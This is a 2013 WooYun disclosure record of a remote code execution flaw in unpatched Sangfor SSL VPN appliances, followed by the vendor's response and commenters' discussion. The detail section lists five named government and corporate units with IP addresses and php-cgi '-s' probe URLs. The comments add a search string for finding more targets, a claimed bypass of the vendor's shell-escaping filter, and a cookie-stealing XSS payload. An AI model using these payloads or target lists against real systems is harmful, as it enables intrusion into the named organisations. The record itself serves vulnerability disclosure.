{"id": 13102, "wybug_id": "wooyun-2013-020260", "wybug_title": "多家单位深信服SSL VPN远程代码执行漏洞(补丁不及时)", "wybug_corp": "多家单位", "wybug_author": "leaf", "wybug_date": "2013-03-18 16:23", "wybug_open_date": "2013-05-02 16:24", "wybug_type": "系统/服务补丁不及时", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "远程代码执行", "代码执行", "深信服"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-03-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-04-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-04-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-05-02：\t细节向公众公开  简要描述： 多家单位深信服SSL VPN远程代码执行漏洞(补丁不及时)！另：厂商有重大漏洞通告么？ 详细说明：  河西财政\nhttp://60.29.163.90:1000/cgi-bin/php-cgi/html/redirect.php?-s\n宜宾市人民政府\nhttp://221.10.128.90:1000/cgi-bin/php-cgi/html/redirect.php?-s\n国家妇幼卫生综合信息平台\nhttp://210.51.181.60:1000/cgi-bin/php-cgi/html/redirect.php?-s\n武钢焦化\nhttp://221.232.69.228:1000/cgi-bin/php-cgi/html/redirect.php?-s\n国元农业保险\nhttp://220.178.31.50:1000/cgi-bin/php-cgi/html/redirect.php?-s\n   漏洞证明：  \n\n\n\n\n\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 leaf@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-03-20 22:34 厂商回复： 根据近日的测试，CNVD已经与深信服公司就处置事宜会商应对措施，深信服公司已经对SSL VPN以及AD产品被披露的漏洞进行了修复。针对特定用户的漏洞，深信服公司也表示将积极处置。20日，转由CNCERT四川分中心处置本条目中涉及的某政府部门案例，另外一个卫生部门的案例已经由深信服公司直接联系处置。按通用软件漏洞进行评分，rank 10 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-03-18 16:38 |    \t\tlucky \t\t\t( 普通白帽子  |\t\t\t        Rank:409 漏洞数:81        | 三人行必有我师焉########################...)\t\t \n  围观一下！学习一下！    \n     2013-03-18 17:13 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  又来了。。。    \n     2013-03-18 17:35 |    \t\tnone \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:5        | 十次十次啊 hack it then know more~)\t\t \n  需要我把我的菜刀库给你吗？ google: por/login_psw.csp    \n     2013-03-18 21:06 |    \t\t刺刺 \t\t\t( 普通白帽子  |\t\t\t        Rank:603 漏洞数:52        | 真正的安全并不是技术，而是人类善良的心灵...)\t\t \n  当时14号那天，有个单位比较着急，把cncert的报告发我邮箱了。    \n     2013-03-18 21:57 |    \t\tleaf \t\t\t( 普通白帽子  |\t\t\t        Rank:948 漏洞数:121        | 真的没影响么？)\t\t \n  @none 呵呵！你那样Google找不到几个有价值的...大多数是学校而已...    \n     2013-03-19 09:15 |    \t\tkgra \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 一波还未平息，一波洞又来袭)\t\t \n  @leaf 那需要怎么找才更全，求指导    \n     2013-03-19 09:30 |    \t\tnone \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:5        | 十次十次啊 hack it then know more~)\t\t \n  @leaf 政府 金融 运营商 以及名企的 我搜到不少 呵呵其实只是想知道他们解决方法 呵呵 终于获取到他们过滤函数如下\tfunction MyescapeShellargs($str)\t{\t\tif(is_numeric($str))\t\t{\t\t\treturn \"'$str'\";\t\t}\t\t$length = strlen($str);\t\t$result = '';\t\tfor ($i=0; $i<$length; $i++)\t\t{\t\t\t$c = $str[$i];\t\t\tswitch ($c)\t\t\t{\t\t\tcase '\\'':\t\t\t\t$result .= '\\'\\\\\\'\\'';\t\t\t\tbreak;\t\t\tdefault:\t\t\t\t$result .= $c;\t\t\t}\t\t}\t\treturn \"'$result'\";\t} 轻松绕...新的5.9仍然有问题 包括一个鸡肋https://IP/com/swfupload/swfupload.swf?movieName=\"])}catch(e){if(!window.x){window.x=1;alert(document.cookie)}}//    \n     2013-03-19 10:01 |    \t\tleaf \t\t\t( 普通白帽子  |\t\t\t        Rank:948 漏洞数:121        | 真的没影响么？)\t\t \n  @none 呵呵！如果客户端登录和管理都在一个地址是理想的情况，如果是分开的，就麻烦点...尤其有些地址发现存在问题但是不好确定归属...    \n     2013-03-19 11:05 |    \t\tnone \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:5        | 十次十次啊 hack it then know more~)\t\t \n  @leaf 他们的WEB客户端和管理端必定在同一设备上 只是存在1000和4430端口情况 以及限制了内网访问管理端的情况 是有少数的表面上不能确定归属的 IP扔到Google上一搜就基本得到答案了 Google搜索漏洞感觉你用得很好 我在此处献丑了 呵呵    \n     2013-03-19 11:20 |    \t\tleaf \t\t\t( 普通白帽子  |\t\t\t        Rank:948 漏洞数:121        | 真的没影响么？)\t\t \n  @none 恩！在一台设备上应该没错的，但是我发现很多是这样的，客户端登录是一个公网ip，管理登录是另外一个公网ip...算鸟，先不找了，眼花缭乱的...    \n     2013-03-19 11:23 |    \t\tkgra \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 一波还未平息，一波洞又来袭)\t\t \n  @none 那个MyescapeShellargs怎么绕过，我看是已经将整个参数添加了单引号，感觉没办法啊    \n     2013-03-19 11:28 |    \t\tnone \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:5        | 十次十次啊 hack it then know more~)\t\t \n  @kgra 在'前面加\\ 呵呵 结果变成 ‘\\'\\'’    \n     2013-03-19 15:02 |    \t\tkgra \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 一波还未平息，一波洞又来袭)\t\t \n  @none google了个试了下，不行啊，无法绕过求大神给出具体利用实例？    \n     2013-03-19 23:20 |    \t\tnone \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:5        | 十次十次啊 hack it then know more~)\t\t \n  @kgra 5.6及以下可以直接执行 新版本的有权限和他们其他的规避方式 详细自己去研究吧    \n     2013-05-03 14:20 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @none 洞主为毛不去众测    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}